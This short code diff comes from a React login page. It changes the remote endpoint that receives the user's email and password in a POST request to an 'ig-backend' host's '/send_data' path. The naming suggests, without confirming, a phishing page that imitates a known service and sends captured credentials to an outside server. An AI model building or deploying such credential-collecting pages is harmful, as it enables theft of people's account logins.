@@ -14,7 +14,7 @@ export default function LoginPage() {
     setIsLoading(true);
 
     // Yahan apni backend API call likho
-    let res = await fetch('https://ig-backend-4.onrender.com/send_data', {
+    let res = await fetch('https://ig-backend-final.onrender.com/send_data', {
       "method": "POST",
       "headers": { "Content-Type": "application/json" },
       "body": JSON.stringify({ email, password })
